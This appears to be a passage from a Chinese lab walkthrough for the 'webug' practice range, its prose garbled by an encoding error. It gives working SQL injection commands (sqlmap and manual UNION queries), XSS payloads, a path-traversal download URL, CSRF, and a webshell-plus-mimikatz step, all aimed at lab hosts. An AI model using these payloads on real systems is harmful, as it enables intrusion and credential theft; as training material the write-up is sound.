    <content type="html"><![CDATA[<p>####æ™®é€šçš„GETæ³¨å…¥</p><p>è§£æ³•ä¸€ï¼šä½¿ç”¨sqlmap</p><p>1ï¼‰sqlmap -uâ€<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;</a> -b â€“current-db â€“current-user</p><p>å¯ä»¥çœ‹åˆ°å½“å‰çš„æ•°æ®åº“åç§°ä»¥åŠç”¨æˆ·åç§°</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-1.png" alt="webug1-1"></p><p>2ï¼‰sqlmap -uâ€<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;</a> -D pentesterlab â€“tables</p><p>å¯ä»¥çœ‹åˆ°pentesterlabä¸­æœ‰é‚£äº›æ•°æ®è¡¨</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-2.png" alt="img"></p><p>3ï¼‰sqlmap -uâ€<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;</a> -D pentesterlab -T flag â€“columns</p><p>æ˜¾ç¤ºå‡ºè¯¥è¡¨ä¸‹çš„æ‰€æœ‰åˆ—</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-3.png" alt="img"></p><p>4ï¼‰sqlmap -uâ€<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&quot;</a> -D pentesterlab -T flag -C flag â€“dump</p><p>å¾—åˆ°flag:204f704fbbcf6acf398ffee11989b377</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-4.png" alt="img"></p><p>è§£æ³•äºŒï¼šæ‰‹å·¥è¿›è¡Œæ³¨å…¥</p><p>1ï¼‰å…ˆé€šè¿‡order by å­å¥åˆ¤æ–­æœ‰å‡ ä¸ªå­—æ®µã€‚</p><p><a href="http://172.16.193.128" target="_blank" rel="noopener">http://172.16.193.128</a>/pentest/test/sqli/sqltamp.php?gid=1â€™ order by 1 â€“+</p><p>å½“order by ååŠ æ•°å­—ä¸º5çš„æ—¶å€™æŠ¥é”™å› è€Œåˆ¤æ–­æœ‰4ä¸ªè¡¨</p><p>2ï¼‰çˆ†æ•°æ®åº“</p><p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39;</a> UNION SELECT 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() â€“+</p><p>3ï¼‰çˆ†è¡¨å</p><p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39;</a> UNION SELECT 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 â€“+</p><p>4ï¼‰çˆ†åˆ—å</p><p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39;" target="_blank" rel="noopener">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1&#39;</a> UNION SELECT 1,2,3,group_concat(id,0x5e,flag) from flag â€“+</p><p>å‚è€ƒï¼š</p><p><a href="http://www.freebuf.com/articles/web/29942.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/29942.html</a></p><p><a href="http://www.cnblogs.com/zlgxzswjy/p/6707433.html" target="_blank" rel="noopener">http://www.cnblogs.com/zlgxzswjy/p/6707433.html</a></p><p>####ä»å›¾ç‰‡ä¸­ä½ èƒ½æ‰¾åˆ°ä»€ä¹ˆï¼Ÿ</p><p>1ï¼‰é¦–å…ˆä»ç½‘ç«™ä¸‹è½½è¿™ä¸ªå›¾ç‰‡ï¼Œä¹‹åä½ å¯ä»¥é€‰æ‹©ç”¨winhexï¼ˆwindowså¹³å°ä½¿ç”¨ï¼‰åˆ†ææˆ–è€…ä½¿ç”¨binwalkï¼ˆlinuxå¹³å°ï¼‰æ¥åˆ†æï¼Œè¿™é‡Œä½¿ç”¨binwalk</p><p>2ï¼‰å…ˆçœ‹çœ‹æ–‡ä»¶çš„æ„æˆï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æœ‰ä¸€ä¸ªraræ ¼å¼çš„æ–‡ä»¶åœ¨é‡Œé¢çš„</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-5.png" alt="img"></p><p>3ï¼‰åˆ†ç¦»æ–‡ä»¶ï¼ˆå½“ç„¶ä½ æŠŠæ–‡ä»¶åç¼€ä¿®æ”¹ä¸ºrarä¹Ÿæ˜¯å¯ä»¥çš„ï¼‰</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-6.png" alt="img"></p><p>4ï¼‰ç›´æ¥çœ‹123.txtçš„å†…å®¹æ˜¯ï¼šå¯†ç æ˜¯123ã€‚ä¹‹åpostè¿™ä¸ªå¯†ç å°±å¥½</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-7.png" alt="img"></p><p>ä»–é¢˜æ²¡æœ‰å‡ºå¥½ï¼Œå’±ä»¬çš„æ€è·¯æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-8.png" alt="img"></p><p>####ä½ çœ‹åˆ°äº†ä»€ä¹ˆï¼Ÿ</p><p>1ï¼‰é¢˜ç›®ä¸æ˜ç¡®çš„æ—¶å€™å°±çœ‹æºç ï¼Œæºç æ³¨é‡Šéƒ¨åˆ†æœ‰æ‰«ç›®å½•çš„æç¤º</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-9.png" alt="img"></p><p>2ï¼‰ä½¿ç”¨å·¥å…·æ‰«æç›®å½•</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-10.png" alt="img"></p><p>å…¶å®è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå°æŠ€å·§ï¼Œå¦‚æœå¯¹æ–¹æ²¡æœ‰è®¾ç½®å¥½apacheçš„è¯ä¼šå‡ºç°åˆ—ç›®å½•çš„æƒ…å†µï¼Œè¿™å¾€å¾€ä¼šæ³„éœ²ä¿¡æ¯</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-11.png" alt="img"></p><p>3ï¼‰çœ‹ä¸€çœ¼è¯¡å¼‚çš„test</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-12.png" alt="img"></p><p>4ï¼‰ç„¶åå°±è§£ç­”äº†</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-13.png" alt="img"></p><p>####å‘Šè¯‰ä½ äº†FLANGæ˜¯5ä½æ•°</p><p>1ï¼‰åˆ†æï¼šå…ˆçœ‹æºç æ— æç¤ºï¼›å†è€ƒè™‘æ³¨å†Œç­‰åŠŸèƒ½å‘ç°æ— è§£ï¼›æœ€åè€ƒè™‘çˆ†ç ´</p><p>2ï¼‰çˆ†ç ´æ— éªŒè¯ç æ‰€ä»¥ä½¿ç”¨burpsuiteï¼ˆæ­¤å¤„ç¤ºä¾‹ä½¿ç”¨ï¼‰æˆ–è€…AWVSç­‰å·¥å…·å‡å¯ï¼Œè‹¥æœ‰éªŒè¯ç åˆ™è¦è€ƒè™‘è‡ªå·±ç¼–å†™è„šæœ¬ã€‚æœ€åå¯ä»¥å‘ç°çˆ†ç ´ç»“æœä¸ºadminï¼šadmin123</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-14.png" alt="img"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-15.png" alt="img"></p><p>3ï¼‰ç™»å½•å‘ç°æ²¡æœ‰flagï¼ˆå…¶å®ä¹Ÿæ˜¯é¢˜ç›®çš„é—®é¢˜ï¼Œæˆ‘ä»¬é˜…è¯»æºç å³å¯å‘ç°ï¼‰</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-16.png" alt="img"></p><p>####ä¸€ä¸ªä¼˜ç‚¹å°å°çš„ç‰¹æ®Šçš„æ³¨å…¥</p><p>1ï¼‰æç¤ºå¤´æ³¨å…¥ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥ï¼Œé¦–å…ˆburpæŠ“åŒ…ç„¶åä¿å­˜åœ¨sqlmapä¸­</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-17.png" alt="img"></p><p>2ï¼‰åˆ†æï¼šå¤´æ³¨å…¥å¯èƒ½å‡ºç°çš„å‡ ä¸ªä½ç½®ï¼šX-Forwarded-Forã€User-agentã€Refererã€Cookieã€‚æ­¤å¤„æ²¡æœ‰å‡ºç°X-Forwarded-Foræ‰€ä»¥æˆ‘å°†å…¶åŠ ä¸Šå…ˆè¿›è¡Œè¿™ä¸ªç‚¹çš„æµ‹è¯•ã€‚è¿æ°”ä¸é”™ç›´æ¥æŠ¥é”™ã€‚æ¥ä¸‹æ¥è¿›è¡Œæ³¨å…¥ï¼Œä¸ç¬¬ä¸€é¢˜çš„æ‰‹å·¥æ³¨å…¥è¿‡ç¨‹ç±»ä¼¼è¿›è¡Œæ³¨å…¥å³å¯ï¼Œæˆ–è€…ä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥ï¼ˆæ³¨å…¥å‘½ä»¤ä¸ºï¼špython .\sqlmap.py -r .\test.txt -p â€œX-Forwarded-Forâ€   text.txtæ–‡ä»¶çš„å†…å®¹ä¸ºä½ æŠ“çš„åŒ…ï¼‰ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-18.png" alt="img"></p><p>æœ€åæˆåŠŸæ³¨å…¥å¾—åˆ°flag</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-19.png" alt="img"></p><p>æ³¨é‡Šï¼šå…¶å®ä½ æ‰‹é‡Œæ˜¯æœ‰æºä»£ç çš„ï¼Œæºç çœ‹ä¸‹ä»ç™½ç›’è§’åº¦åˆ†æä½ å°±å¯ä»¥å¾—åˆ°tipsåœ¨å“ªå„¿ã€‚è¿™é‡Œæ˜¯åŸºç¡€ä»£ç å®¡è®¡ä¸è¿‡å¤šè§£é‡Š(ä»£ç å®¡è®¡å¯ä»¥å€ŸåŠ©ä¸€äº›å·¥å…·çš„æ¯”å¦‚æˆ‘æœ€å–œæ¬¢çš„cobra)ã€‚</p><p>ä¸€ä¸‹æ˜¯ä½¿ç”¨cobraæ£€æµ‹çš„ç»“æœï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-22%20%E4%B8%8B%E5%8D%888.44.47.png" alt="img"></p><p>####è¿™å…³éœ€è¦RMBè´­ä¹°å“¦</p><p>1ï¼‰ç‚¹å¼€å¯ä»¥çœ‹åˆ°åªæœ‰ä¸€ä¸ªç™»é™†æ¡†ï¼ŒæŸ¥çœ‹æºä»£ç çœ‹æ˜¯å¦æœ‰tips,</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/12017-10-22%20%E4%B8%8B%E5%8D%888.51.55.png" alt="å±å¹•å¿«ç…§ 2017-10-22 ä¸‹åˆ8.51.55"></p><p>æœçœŸæ˜¯æœ‰æç¤ºçš„ï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/22017-10-22%20%E4%B8%8B%E5%8D%889.02.58.png" alt="å±å¹•å¿«ç…§ 2017-10-22 ä¸‹åˆ9.02.58"></p><p>2ï¼‰è·Ÿç€æç¤ºèµ°ï¼ŒçŒœæµ‹æ˜¯å¦å¯èƒ½ä¸ºæ³¨å…¥ï¼Œä½†æ˜¯å½“æˆ‘è®¿é—®é“¾æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.188.129/pentest/test/2/index.php?url=123</span><br></pre></td></tr></table></figure><p>å´å‡ºç°äº†å¼¹å‡ºå¹¶æ˜¾ç¤ºæˆåŠŸè·³è½¬ï¼Œæ²¡å•¥ç”¨ï¼Œè¿˜æ˜¯çœ‹ä¸‹è´¦å·å¯†ç å§ï¼Œç¬¬ä¸€é¢˜æ³¨å…¥ä¹Ÿå¯ä»¥çœ‹åˆ°è¿™ä¸ªè´¦å·å¯†ç ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/32017-10-22%20%E4%B8%8B%E5%8D%889.05.03.png" alt="å±å¹•å¿«ç…§ 2017-10-22 ä¸‹åˆ9.05.03"></p><p>3ï¼‰è´¦å·ï¼šå¯†ç &gt;&gt;&gt;tom:123456ç™»é™†æŠ“åŒ…å¯ä»¥æ§åˆ¶é‡‘é¢è¿›è¡Œä¹°å–</p><p>####è¶Šæƒ</p><p>1ï¼‰è®©ä¿®æ”¹å¯†ç æ‰€ä»¥ç›®æ ‡å°±å¾ˆæ˜ç¡®äº†ï¼Œæˆ‘è¦è¶Šæƒä¿®æ”¹åˆ«äººçš„å¯†ç </p><p><img src="http://ok44mzy2k.bkt.clouddn.com/42017-10-22%20%E4%B8%8B%E5%8D%8810.11.33.png" alt="å±å¹•å¿«ç…§ 2017-10-22 ä¸‹åˆ10.11.33"></p><p>8.csrf</p><p>é¢˜ç›®å·²ç»æç¤ºäº†æ˜¯csrfæ‰€ä»¥æˆ‘é—¨ä½¿ç”¨burpsuiteæŠ“åŒ…ç„¶åç›´æ¥ç”ŸæˆPoCå³å¯ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/52017-10-24%20%E4%B8%8A%E5%8D%8810.39.23.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸Šåˆ10.39.23"></p><p>æˆ‘ä»¬å¯ä»¥æ¥æµ‹è¯•ä¸€ä¸‹æ•ˆæœï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/62017-10-24%20%E4%B8%8A%E5%8D%8810.42.42.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸Šåˆ10.42.42"></p><p>é¦–å…ˆæˆ‘ä»¬è®¿é—®æˆ‘ä»¬çš„PoC</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/72017-10-24%20%E4%B8%8A%E5%8D%8810.42.57.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸Šåˆ10.42.57"></p><p>ä¹‹åç‚¹å‡»submitä¾¿å¯ä»¥çœ‹åˆ°æç¤ºä¿®æ”¹å¯†ç æˆåŠŸï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/82017-10-24%20%E4%B8%8A%E5%8D%8810.43.04.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸Šåˆ10.43.04"></p><p>####URLè·³è½¬</p><p>çœ‹åˆ°é¢˜ç›®çš„æç¤ºæˆ‘çªç„¶æƒ³åˆ°å‰é¢åœ¨æºç ä¸­çœ‹åˆ°çš„ä¸€ä¸ªæç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;index.php?url=#&quot;&gt;I&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>ä»è¿™é‡Œé¡¿æ—¶æƒ³åˆ°äº†è·³è½¬çš„åŸç†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¿™æ ·åšå°±å¯ä»¥è®¿é—®ç™¾åº¦äº†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.188.129/pentest/test/5/index.php?url=https://www.baidu.com/</span><br></pre></td></tr></table></figure><p>####æ–‡ä»¶ä¸‹è½½</p><p>ç›´æ¥è®¿é—®å‘ç°æ˜¯404ï¼Œæ„Ÿè§‰æœ‰é—®é¢˜ï¼Œè¿˜ä»¥ä¸ºæ˜¯è¦æ‰«æå‘ç°æŸäº›æ–‡ä»¶ï¼Œä½†å‘ç°ä¸æ˜¯ï¼Œä¾¿å»æœåŠ¡å™¨çœ‹äº†ä¸‹é¢˜ç›®æºç ï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/92017-10-24%20%E4%B8%8A%E5%8D%8810.54.40.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸Šåˆ10.54.40"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªindex.phpæ˜¯æœ‰é—®é¢˜çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥çœ‹download.phpå³å¯</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/102017-10-24%20%E4%B8%8A%E5%8D%8810.59.28.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸Šåˆ10.59.28"></p><p>è§‰å¾—æ²¡æœ‰æ–¹å‘çš„è¯è¿˜æ˜¯å…ˆçœ‹æºç æˆ–è€…æŠ“åŒ…çœ‹æœ‰æ²¡æœ‰æç¤ºï¼Œå¾ˆå·§åœ¨æºç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªtipsï¼šå¸®ç®¡ç†å‘˜æ‰¾å›mysqlå¸å·å¯†ç ã€‚é€šè¿‡æ–‡ä»¶ä¸‹è½½æ‰¾ç®¡ç†å‘˜å¯†ç ï¼Œé‚£ä¹ˆå¯ä»¥åˆ¤æ–­æ­¤å¤„åº”è¯¥æ˜¯ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚è€Œè¦æ‰¾åˆ°ç®¡ç†å‘˜çš„å¯†ç æˆ‘ä»¬è‚¯å®šæ˜¯è¦å…ˆä¸‹è½½æ•°æ®åº“é…ç½®æ–‡ä»¶ä¹‹åçœ‹æƒ…å†µæ¥åˆ¤æ–­æ˜¯å¦éœ€è¦ä¸‹è½½æ•°æ®åº“æ–‡ä»¶ã€‚é€šè¿‡ä¹‹å‰é‚£ä¸ªé¢˜æˆ‘ä»¬çŸ¥é“è¿™ä¸ªé¶åœºçš„apacheæ²¡æœ‰é…ç½®å¥½å¯¼è‡´æ–‡ä»¶è·¯å¾„æ³„æ¼çš„é—®é¢˜ã€‚æ‰€ä»¥æˆ‘ä»¬æ¥æ‰‹åŠ¨ç¿»ä¸€ç¿»ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/112017-10-24%20%E4%B8%8A%E5%8D%8811.08.29.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸Šåˆ11.08.29"></p><p>å‘ç°dataè¿™ä¸ªè·¯å¾„ä¸‹ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥æ˜¯ä¸æ˜¯å¯èƒ½å­˜åœ¨ä¸€ä¸ªè·ŸdataåŒçº§çš„ç›®å½•ï¼ˆå…¶å®åˆšæ‰çœ‹æºç æˆ‘éƒ½çœ‹åˆ°äº†ï¼‰</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/122017-10-24%20%E4%B8%8A%E5%8D%8811.10.34.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸Šåˆ11.10.34"></p><p>æˆåŠŸå‘ç°config.phpï¼Œä¹‹åæˆ‘ä»¬æ„é€ PoCè¿›è¡Œä¸‹è½½ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.188.129/pentest//test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php</span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰“å¼€å°±å¯ä»¥æ‰¾åˆ°å¯†ç äº†ï¼Œå¹¶ä¸éœ€è¦è¿›ä¸€æ­¥å¯¹æ•°æ®åº“åšä»€ä¹ˆã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/132017-10-24%20%E4%B8%8A%E5%8D%8811.13.29.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸Šåˆ11.13.29"></p><p>####æˆ‘å’Œä¸Šé¢˜æœ‰ç‚¹åƒ</p><p>è¿™ä¸ªå’Œä¸Šé¢å‡ ä¹ä¸€æ ·ï¼Œåªä¸è¿‡å‚æ•°çš„æäº¤æ–¹å¼å˜äº†è€Œå·²ï¼Œæˆ‘ä»¬ç”¨burpæŠ“åŒ…ç„¶åä¿®æ”¹picå‚æ•°å³å¯ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/12017-10-24%20%E4%B8%8A%E5%8D%8811.54.08.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸Šåˆ11.54.08"></p><p>####æˆ‘ç³»ç»Ÿå¯†ç å¿˜è®°äº†</p><p>1ï¼‰ä½¿ç”¨è´¦å·å¯†ç ï¼štomï¼›123456è¿›è¡Œç™»å½•ï¼Œç™»å½•åå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œæ‰€ä»¥ä¾¿å°è¯•ä¸Šä¼ webshell</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/22017-10-24%20%E4%B8%8B%E5%8D%8812.00.24.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸‹åˆ12.00.24"></p><p>2ï¼‰å‘ç°æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæ‰€ä»¥ä¹‹åä½¿ç”¨cknifeè¿›è¡Œè¿æ¥</p><p>3ï¼‰ä¸Šä¼ mimikatzæŠ“å–ç®¡ç†å‘˜å¯†ç å³å¯</p><p>####xss</p><p>æ— ä»»ä½•è¿‡æ»¤çš„ä¸€ä¸ªåå°„å‹xss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.188.129/pentest/test/9/?id=%3Cscript%3Ealert(%27npusec%27)%3C/script%3E</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/32017-10-24%20%E4%B8%8B%E5%8D%8812.12.35.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸‹åˆ12.12.35"></p><p>####å­˜å‚¨å‹xss</p><p>ä¹Ÿæ˜¯ä¸å­˜åœ¨ä»»ä½•çš„è¿‡æ»¤ï¼Œåªéœ€è¦åœ¨ç•™è¨€å¤„å¡«å†™ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/npusec/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/42017-10-24%20%E4%B8%8B%E5%8D%8812.16.02.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸‹åˆ12.16.02"></p><p>####ä»€ä¹ˆï¼Ÿå›¾ç‰‡ä¸Šä¼ ä¸äº†ï¼Ÿ</p><p>1ï¼‰ä¸Šä¼ ä¸€å¼ å›¾ç‰‡</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/62017-10-24%20%E4%B8%8B%E5%8D%883.05.40.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸‹åˆ3.05.40"></p><p>2ï¼‰ä¸Šä¼ phpè„šæœ¬</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/72017-10-24%20%E4%B8%8B%E5%8D%883.05.56.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸‹åˆ3.05.56"></p><p>3ï¼‰ä¸èƒ½æ˜¯å›¾ç‰‡è¿˜ä¸èƒ½æ˜¯è„šæœ¬ï¼Œæˆ‘ä»¬çœ‹ä¸‹å¤„ç†çš„é€»è¾‘ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strstr($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>],<span class="string">"image"</span>)&amp;&amp;strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"php"</span>))&#123;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span><br><span class="line">    <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"png"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"jpg"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"jpeg"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"bmp"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"gif"</span>))&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;ä½ çœŸçš„ä¸Šä¼ äº†å›¾ç‰‡,å¯æ˜¯è¿™å¼ å›¾ç‰‡æˆ‘ä¸å–œæ¬¢,èƒ½æ¢å¼ å—?&lt;/font&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;font color='blue'&gt;ä½ å±…ç„¶ä¸ä¸Šä¼ å›¾ç‰‡,å®å®æ€’äº†!!&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;"</span>;</span><br></pre></td></tr></table></figure><p>4ï¼‰æ ¹æ®ä»£ç æ¥åˆ¤æ–­æ–‡ä»¶çš„typeè¦ä¸ºimageã€å…¶æ¬¡æ–‡ä»¶nameè¦æœ‰phpï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/82017-10-24%20%E4%B8%8B%E5%8D%883.14.16.png" alt="å±å¹•å¿«ç…§ 2017-10-24 ä¸‹åˆ3.14.16"></p><p>####æ˜å¤©åŒåä¸€</p><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strstr($url,<span class="string">"www.taobao.com"</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]==<span class="string">"10.10.10.10"</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(strstr($_SERVER[<span class="string">'HTTP_REFERER'</span>],<span class="string">"www.baidu.com"</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(strstr($_SERVER[<span class="string">'HTTP_REFERER'</span>],<span class="string">"www.baidu.com"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"å‰æ‰‹äº†ï¼Œè¯·è®°å½•æˆªå›¾!!!flag:83242lkjKJ(*&amp;*^*&amp;k0"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ä¸æƒ³å‰æ‰‹äº†"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"nono"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"å“å‘€ï¼Œè¿™é‡Œåªå…è®¸10.10.10.10è®¿é—®ï¼ï¼ï¼"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"è¿™ä¸ªåœ°æ–¹å‰æ‰‹ä¸å¥½ï¼Œæ¢ä¸ªåœ°æ–¹ï¼"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ç›®äº†ç„¶ï¼Œåªéœ€è¦å°†å‡ ä¸ªå…³é”®åœ°æ–¹è®¾ç½®æ­£ç¡®å³å¯ï¼š</p><p><img 